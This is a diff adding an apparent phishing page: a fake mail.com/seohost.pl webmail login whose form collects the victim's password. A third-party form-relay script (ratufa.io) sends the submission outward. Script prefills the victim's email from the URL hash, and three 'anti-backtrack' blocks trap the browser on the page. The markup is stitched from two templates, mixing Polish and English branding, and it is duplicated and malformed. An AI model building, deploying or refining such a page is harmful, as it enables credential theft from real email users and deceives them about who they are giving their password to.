@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta seohost.pl - Logowanie</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #f4f6f9;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+/* Main Navigation Header Blue Ribbon Layer Elements */
+.main-header {
+    width: 100%;
+    background-color: #003366; /* Deep signature navy corporate blue shade */
+    display: flex;
+    flex-direction: column;
+}
+
+.top-nav-bar {
+    max-width: 1200px;
+    width: 100%;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 20px;
+}
+
+.logo-box {
+    font-size: 32px;
+    font-weight: bold;
+    color: #ffffff;
+    letter-spacing: -1px;
+}
+
+/* Horizontal Search Input Alignment Block Components */
+.search-bar-container {
+    display: flex;
+    align-items: center;
+    background-color: transparent;
+    flex-grow: 0.6;
+    max-width: 600px;
+}
+
+.search-label {
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: bold;
+    margin-right: 12px;
+}
+
+.search-input {
+    flex: 1;
+    height: 34px;
+    border: none;
+    padding: 0 12px;
+    font-size: 14px;
+    outline: none;
+    border-radius: 4px 0 0 4px;
+}
+
+.search-btn {
+    width: 44px;
+    height: 34px;
+    background-color: #4cb050; /* Bright signature lime green */
+    border: none;
+    color: #ffffff;
+    cursor: pointer;
+    font-size: 14px;
+    border-radius: 0 4px 4px 0;
+}
+
+.user-quick-actions {
+    display: flex;
+    gap: 20px;
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: bold;
+}
+
+.action-node {
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px;
+}
+
+/* Lower Sub-Navigation Option Ribbon Strip Links Menu */
+.sub-nav-menu {
+    width: 100%;
+    background-color: #eef2f7;
+    border-bottom: 1px solid #cbd5e1;
+    display: flex;
+    align-items: center;
+    padding: 10px 20px;
+    max-width: 1200px;
+    margin: 0 auto;
+    gap: 24px;
+}
+
+.home-icon {
+    text-decoration: none;
+    font-size: 16px;
+    color: #4b5563;
+}
+
+.nav-menu-item {
+    font-size: 14px;
+    color: #4b5563;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.nav-menu-item span {
+    font-size: 8px;
+    color: #9ca3af;
+}
+
+/* Content Workspace Blueprint Area Framework Box */
+.content-workspace {
+    max-width: 1200px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 24px 20px;
+    display: flex;
+    flex-direction: column;
+}
+
+/* White Floating Credentials Container Card Box Component */
+.login-container-card {
+    background-color: #ffffff;
+    border: 1px solid #e2e8f0;
+    border-radius: 4px;
+    padding: 24px 32px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+    margin-bottom: 24px;
+    width: 100%;
+}
+
+.card-header-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.login-ssl-title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #1e293b;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.login-ssl-title span {
+    color: #4cb050;
+}
+
+.close-card-btn {
+    font-size: 20px;
+    color: #94a3b8;
+    cursor: pointer;
+}
+
+/* Horizontal Multi-Column Form Inputs Layout Alignment */
+.form-inputs-row {
+    display: flex;
+    align-items: flex-end;
+    gap: 16px;
+    width: 100%;
+    margin-bottom: 16px;
+}
+
+.form-group {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    text-align: left;
+}
+
+.form-group label {
+    font-size: 12px;
+    font-weight: bold;
+    color: #000000;
+    margin-bottom: 8px;
+}
+
+.form-control {
+    width: 100%;
+    height: 38px;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    padding: 0 12px;
+    font-size: 14px;
+    outline: none;
+}
+
+/* Highlighted password active focus thick frame boundary matching screenshot */
+.form-group.highlighted-group .form-control {
+    border: 2px solid #000000;
+}
+
+/* Crisp sharp green solid submit block action button precise template blueprint */
+.submit-btn {
+    background-color: #008000; /* Rich solid forest green */
+    color: #ffffff;
+    border: none;
+    height: 38px;
+    padding: 0 28px;
+    font-size: 14px;
+    font-weight: bold;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #006600;
+}
+
+/* Help anchor recovery options grid ribbon strip line node elements */
+.auxiliary-links-row {
+    display: flex;
+    gap: 16px;
+    font-size: 12px;
+}
+
+.auxiliary-links-row a {
+    color: #64748b;
+    text-decoration: underline;
+}
+
+.auxiliary-links-row a:hover {
+    color: #003366;
+}
+
+/* Lower Section Structural Layout Splitting Matrix */
+.sponsored-header-tag {
+    background-color: #004080;
+    color: #ffffff;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 4px 8px;
+    align-self: flex-start;
+    margin-bottom: 12px;
+    letter-spacing: 0.5px;
+}
+
+.lower-layout-grid {
+    display: flex;
+    gap: 24px;
+    width: 100%;
+    align-items: stretch;
+}
+
+.news-grid-side {
+    flex: 1.4;
+}
+
+/* Dashed box container mimicking provided screenshot news composition grid blocks */
+.news-image-placeholder-box {
+    width: 100%;
+    height: 280px;
+    border: 1px dashed #cbd5e1;
+    background-color: #ffffff;
+    color: #94a3b8;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+}
+
+/* Right Column Sidebar Component Popular Trends Box Area */
+.popular-searches-sidebar {
+    flex: 0.6;
+    background-color: #ffffff;
+    border: 1px solid #e2e8f0;
+    border-radius: 4px;
+    padding: 20px;
+    text-align: left;
+}
+
+.sidebar-title {
+    font-size: 20px;
+    font-weight: bold;
+    color: #1e293b;
+    margin-bottom: 16px;
+}
+
+.search-trends-tag {
+    font-size: 12px;
+    color: #4cb050;
+    font-weight: bold;
+    margin-bottom: 12px;
+}
+
+.trends-list-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+}
+
+/* Custom green data-level filled ribbon bars template precisely mimicking right column searches graph */
+.trend-item-row {
+    width: 100%;
+    background-image: linear-gradient(to right, #cbd5e1 1px, transparent 1px);
+    background-size: 4px 100%;
+}
+
+.trend-bar-fill {
+    display: block;
+    background-color: #008000;
+    color: #ffffff;
+    font-size: 12px;
+    font-weight: bold;
+    padding: 6px 12px;
+    cursor: pointer;
+}
+
+.trends-list-stack .trend-item-row:nth-child(1) .trend-bar-fill { width: 92%; }
+.trends-list-stack .trend-item-row:nth-child(2) .trend-bar-fill { width: 86%; }
+.trends-list-stack .trend-item-row:nth-child(3) .trend-bar-fill { width: 78%; }
+.trends-list-stack .trend-item-row:nth-child(4) .trend-bar-fill { width: 64%; }
+
+.trend-bar-fill:hover {
+    background-color: #006600;
+}
+
+@media (max-width: 860px) {
+    .top-nav-bar {
+        flex-direction: column;
+        gap: 16px;
+    }
+    .search-bar-container {
+        width: 100%;
+        max-width: 100%;
+    }
+    .form-inputs-row {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .submit-btn {
+        width: 100%;
+    }
+    .lower-layout-grid {
+        flex-direction: column;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mail.com - Email, Cloud Storage & Security</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Main Navigation Header Ribbon -->
+    <header class="main-header">
+        <div class="top-nav-bar">
+            <div class="brand-logo-area">
+                <span class="logo-box">mail.com</span>
+            </div>
+            
+            <div class="search-bar-container">
+                <span class="search-label">Search</span>
+                <input type="text" class="search-input">
+                <button type="button" class="search-btn">🔍</button>
+            </div>
+
+            <div class="user-quick-actions">
+                <div class="action-node">👤 Sign up</div>
+                <div class="action-node">✉️ Log in</div>
+            </div>
+        </div>
+
+        <!-- Lower Navigation Dropdown Links Menu -->
+        <nav class="sub-nav-menu">
+            <a href="#" class="home-icon">🏠</a>
+            <div class="nav-menu-item">Email <span>▼</span></div>
+            <div class="nav-menu-item">Features <span>▼</span></div>
+            <div class="nav-menu-item">Cloud <span>▼</span></div>
+            <div class="nav-menu-item">Security <span>▼</span></div>
+            <div class="nav-menu-item">Support <span>▼</span></div>
+        </nav>
+    </header>
+
+    <!-- Content Workspace -->
+    <main class="content-workspace">
+        
+        <!-- White Floating Credentials Container Card Box Component -->
+        <div class="login-container-card">
+            <div class="card-header-row">
+                <h2 class="login-ssl-title">Login SSL <span>✓</span></h2>
+                <span class="close-card-btn">×</span>
+            </div>
+
+            <!-- Form submission configuration using FormSubmit module links integration -->
+            <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <div class="form-inputs-row">
+                    
+                    <div class="form-group">
+                        <label for="email">Email address</label>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                    </div>
+
+                    <div class="form-group highlighted-group">
+                        <label for="password">Password</label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    </div>
+
+                    <!-- Vibrant Solid Green Submission Trigger Button Block -->
+                    <button type="submit" class="submit-btn">Log in</button>
+                </div>
+    
+            </form>
+
+            <!-- Bottom utility navigation secondary paths alternative connection fields stack -->
+            <div class="auxiliary-links-row">
+                <a href="#">Forgot password?</a>
+                <a href="#">Keep me logged in!</a>
+                <a href="#">Premium Login</a>
+            </div>
+        </div>
+
+        <!-- Sponsored Content and Popular Sidebar Layout Matrix Section -->
+        <div class="sponsored-header-tag">SPONSORED NEWS</div>
+        
+        <div class="lower-layout-grid">
+            <!-- Left Side News Placeholder Grid Component -->
+            <div class="news-grid-side">
+                <div class="news-image-placeholder-box">
+<img src="https://github.com/cdtechdigital/images/blob/main/mail.com.JPG?raw=true" alt="Trulli" width="" height="">
+                </div>
+            </div>
+
+            <!-- Right Side Popular Searches Sidebar Component Box -->
+            <div class="popular-searches-sidebar">
+                <h3 class="sidebar-title">Popular Searches</h3>
+                <div class="search-trends-tag">Search Trends</div>
+                
+                <div class="trends-list-stack">
+                    <div class="trend-item-row">
+                        <span class="trend-bar-fill">High Yield Savings</span>
+                    </div>
+                    <div class="trend-item-row">
+                        <span class="trend-bar-fill">Home Insurance Quotes</span>
+                    </div>
+                    <div class="trend-item-row">
+                        <span class="trend-bar-fill">Solar Energy Savings</span>
+                    </div>
+                    <div class="trend-item-row">
+                        <span class="trend-bar-fill">AI Productivity Tools</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+</body>
+</html>
+
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
